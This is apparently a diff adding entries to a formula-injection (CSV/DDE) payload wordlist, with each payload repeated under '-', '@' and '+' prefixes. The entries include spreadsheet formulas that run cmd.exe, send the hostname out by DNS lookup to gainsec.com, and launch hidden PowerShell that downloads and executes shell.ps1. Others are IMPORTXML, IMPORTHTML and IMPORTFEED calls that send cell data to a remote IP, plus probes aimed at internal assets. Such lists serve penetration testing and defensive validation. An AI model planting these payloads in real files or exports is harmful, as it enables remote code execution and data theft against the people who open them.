@@ -28,3 +28,78 @@ Shell)
 =CMD|’/c nslookup `hostname`.gainsec.com’!A0
 =CMD|’/c for /f "delims=" %a in ('hostname') do nslookup %a.gainsec.com ’|!A0
 =CELL("filename")
+-CONCATENATE(A2:E2)
+-IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v-", CONCATENATE(A2:E2)), "//a/a10")
+-IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v-", CONCATENATE(A2:E2)))
+-IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v-", CONCATENATE(A2:E2)),"table",1)
+-IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
+-IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
+-SUM(1,1)
+-NOW()
+-WEBSERVICE(“<URL>”)
+-WEBSERVICE(“http://gainsec.com:22”)
+-CELL(“<param>”)
+-INFO(“<param>”)
+-<Program-inpath>|’<params>’![A-z][A-z0-9]*
+-MSPAINT|’<params>’!A0, -CMD|’/c nslookup gainsec.com’!A1
+-cmd|'/c powershell.exe -w hidden $e-(New-ObjectSystem.Net.WebClient).DownloadString("http://gainsec.com/shell.ps1");powershell -e $e'!A1
+-‘C:\Users\<user>\Desktop\[test.xlsx]’!Sheet1!$A$1
+-‘http://listening_responder_instance’!A0
+-‘http://mysite.com/giant/file’!A0
+-’http://<internal_asset>:<port>’!A0
+-FILES(filename)
+-SUM(NOW()+CMD|’/c nslookup 17.gainsec.com’!A1, 1)
+-SUM(1, +-+-+- SUM(2,2))
+-CMD|’/c nslookup `hostname`.gainsec.com’!A0
+-CMD|’/c for /f "delims-" %a in ('hostname') do nslookup %a.gainsec.com ’|!A0
+-CELL("filename")
+@CONCATENATE(A2:E2)
+@IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v-", CONCATENATE(A2:E2)), "//a/a10")
+@IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v-", CONCATENATE(A2:E2)))
+@IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v-", CONCATENATE(A2:E2)),"table",1)
+@IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
+@IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
+@SUM(1,1)
+@NOW()
+@WEBSERVICE(“<URL>”)
+@WEBSERVICE(“http://gainsec.com:22”)
+@CELL(“<param>”)
+@INFO(“<param>”)
+@<Program-inpath>|’<params>’![A-z][A-z0-9]*
+@MSPAINT|’<params>’!A0, -CMD|’/c nslookup gainsec.com’!A1
+@cmd|'/c powershell.exe -w hidden $e-(New-ObjectSystem.Net.WebClient).DownloadString("http://gainsec.com/shell.ps1");powershell -e $e'!A1
+@‘C:\Users\<user>\Desktop\[test.xlsx]’!Sheet1!$A$1
+@‘http://listening_responder_instance’!A0
+@‘http://mysite.com/giant/file’!A0
+@’http://<internal_asset>:<port>’!A0
+@FILES(filename)
+@SUM(NOW()+CMD|’/c nslookup 17.gainsec.com’!A1, 1)
+@SUM(1, +-+-+- SUM(2,2))
+@CMD|’/c nslookup `hostname`.gainsec.com’!A0
+@CMD|’/c for /f "delims-" %a in ('hostname') do nslookup %a.gainsec.com ’|!A0
+@CELL("filename")
++CONCATENATE(A2:E2)
++IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v-", CONCATENATE(A2:E2)), "//a/a10")
++IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v-", CONCATENATE(A2:E2)))
++IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v-", CONCATENATE(A2:E2)),"table",1)
++IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
++IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
++SUM(1,1)
++NOW()
++WEBSERVICE(“<URL>”)
++WEBSERVICE(“http://gainsec.com:22”)
++CELL(“<param>”)
++INFO(“<param>”)
++<Program-inpath>|’<params>’![A-z][A-z0-9]*
++MSPAINT|’<params>’!A0, -CMD|’/c nslookup gainsec.com’!A1
++cmd|'/c powershell.exe -w hidden $e-(New-ObjectSystem.Net.WebClient).DownloadString("http://gainsec.com/shell.ps1");powershell -e $e'!A1
++‘C:\Users\<user>\Desktop\[test.xlsx]’!Sheet1!$A$1
++‘http://listening_responder_instance’!A0
++‘http://mysite.com/giant/file’!A0
++’http://<internal_asset>:<port>’!A0
++FILES(filename)
++SUM(NOW()+CMD|’/c nslookup 17.gainsec.com’!A1, 1)
++SUM(1, +-+-+- SUM(2,2))
++CMD|’/c nslookup `hostname`.gainsec.com’!A0
++CMD|’/c for /f "delims-" %a in ('hostname') do nslookup %a.gainsec.com ’|!A0
++CELL("filename")
